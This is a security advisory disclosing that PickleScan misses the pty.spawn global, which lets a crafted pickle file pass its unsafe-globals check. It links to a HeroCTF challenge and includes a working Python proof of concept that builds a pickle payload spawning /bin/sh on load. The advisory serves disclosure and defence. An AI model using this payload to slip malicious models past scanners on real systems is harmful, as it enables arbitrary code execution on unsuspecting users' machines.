  Picklescan Bypasses Unsafe Globals Check using pty.spawn
  ### Summary
  The vulnerability allows malicious actors to bypass PickleScan's unsafe globals check, leading to potential arbitrary code execution. The issue stems from the absence of the `pty` library (more specifically, of  the `pty.spawn` function) from PickleScan's list of unsafe globals. This vulnerability allows attackers to disguise malicious pickle payloads within files that would otherwise be scanned for pickle-based threats.

  ### Details
  For 2025's [HeroCTF](https://heroctf.fr/), there was a challenge named Irreductible 2 where players would need to bypass the latest versions of PickleScan and [Fickling](https://github.com/trailofbits/fickling/) to gain code execution. The challenge [writeup](https://github.com/HeroCTF/HeroCTF_v7/blob/master/Misc/Irreductible-2/README.md), [files](https://github.com/HeroCTF/HeroCTF_v7/tree/master/Misc/Irreductible-2) and [solve script](https://github.com/HeroCTF/HeroCTF_v7/blob/master/Misc/Irreductible-2/solve.py) have all been released.

  The intended way was to use `pty.spawn` but some players found alternative solutions.

  ### PoC

  - Run the following Python code to generate the PoC pickle file.

  ```py
  import pickle

  command = b"/bin/sh"

  payload = b"".join(
      [
          pickle.PROTO + pickle.pack("B", 4),
          pickle.MARK,
          pickle.GLOBAL + b"pty\n" + b"spawn\n",
          pickle.EMPTY_LIST,
          pickle.SHORT_BINUNICODE + pickle.pack("B", len(command)) + command,
          pickle.APPEND,
          # Additional arguments can be passed by repeating the SHORT_BINUNICODE + APPEND opcodes
          pickle.OBJ,
          pickle.STOP,
      ]
  )

  with open("dump.pkl", "wb") as f:
      f.write(payload)
  ```

  - Run PickleScan on the generated pickle file.

  PickleScan detects the `pty.spawn` global as "suspicious" but not "dangerous", allowing it to be loaded.

  ### Impact
  **Severity**: High
  **Affected Users**: Any organization, like HuggingFace, or individual using PickleScan to analyze PyTorch models or other files distributed as ZIP archives for malicious pickle content.
  **Impact Details**: Attackers can craft malicious PyTorch models containing embedded pickle payloads and bypass the PickleScan check by using the `pty.spawn` function. This could lead to arbitrary code execution on the user's system when these malicious files are processed or loaded.
